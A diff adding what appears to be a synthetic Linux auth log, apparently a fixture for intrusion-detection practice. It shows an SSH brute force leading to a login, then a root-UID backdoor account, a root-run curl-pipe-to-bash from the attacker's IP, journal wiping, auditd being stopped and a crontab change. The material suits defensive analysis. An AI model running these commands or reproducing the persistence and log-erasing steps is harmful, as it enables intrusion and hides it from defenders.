@@ -1,0 +1,28 @@
+Oct 13 07:02:11 web01 sshd[2000]: Accepted publickey for ubuntu from 10.0.3.11 port 51002 ssh2: RSA SHA256:abc
+Oct 13 07:17:01 web01 CRON[2001]: pam_unix(cron:session): session opened for user root by (uid=0)
+Oct 14 09:11:00 web01 sshd[2002]: Failed password for root from 45.137.21.134 port 40000 ssh2
+Oct 14 09:11:07 web01 sshd[2003]: Failed password for admin from 45.137.21.134 port 40001 ssh2
+Oct 14 09:11:14 web01 sshd[2004]: Failed password for invalid user oracle from 45.137.21.134 port 40002 ssh2
+Oct 14 09:11:21 web01 sshd[2005]: Failed password for invalid user postgres from 45.137.21.134 port 40003 ssh2
+Oct 14 09:11:28 web01 sshd[2006]: Failed password for invalid user test from 45.137.21.134 port 40004 ssh2
+Oct 14 09:11:35 web01 sshd[2007]: Failed password for deploy from 45.137.21.134 port 40005 ssh2
+Oct 14 09:11:42 web01 sshd[2008]: Failed password for deploy from 45.137.21.134 port 40006 ssh2
+Oct 14 09:11:49 web01 sshd[2009]: Failed password for ubuntu from 45.137.21.134 port 40007 ssh2
+Oct 14 09:11:56 web01 sshd[2010]: Failed password for invalid user git from 45.137.21.134 port 40008 ssh2
+Oct 14 09:12:03 web01 sshd[2011]: Failed password for invalid user jenkins from 45.137.21.134 port 40009 ssh2
+Oct 14 09:12:10 web01 sshd[2012]: Failed password for deploy from 45.137.21.134 port 40010 ssh2
+Oct 14 09:12:17 web01 sshd[2013]: Failed password for www-data from 45.137.21.134 port 40011 ssh2
+Oct 14 09:12:24 web01 sshd[2014]: Failed password for deploy from 45.137.21.134 port 40012 ssh2
+Oct 14 09:12:31 web01 sshd[2015]: Failed password for invalid user backup from 45.137.21.134 port 40013 ssh2
+Oct 14 09:12:38 web01 sshd[2016]: Failed password for deploy from 45.137.21.134 port 40014 ssh2
+Oct 14 09:12:45 web01 sshd[2017]: Failed password for invalid user ftp from 45.137.21.134 port 40015 ssh2
+Oct 14 09:12:52 web01 sshd[2018]: Failed password for deploy from 45.137.21.134 port 40016 ssh2
+Oct 14 09:12:59 web01 sshd[2019]: Failed password for deploy from 45.137.21.134 port 40017 ssh2
+Oct 14 09:18:30 web01 sshd[2020]: Accepted password for deploy from 45.137.21.134 port 40099 ssh2
+Oct 14 09:18:31 web01 sshd[2021]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Oct 14 09:26:03 web01 useradd[2022]: new user: name=svc-update, UID=0, GID=0, home=/home/svc-update, shell=/bin/bash
+Oct 14 09:26:04 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get install netcat
+Oct 14 09:28:10 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c curl http://45.137.21.134/s.sh | bash
+Oct 14 09:31:02 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s
+Oct 14 09:32:05 web01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl stop auditd
+Oct 14 09:33:08 web01 crontab[4120]: (deploy) REPLACE (deploy)
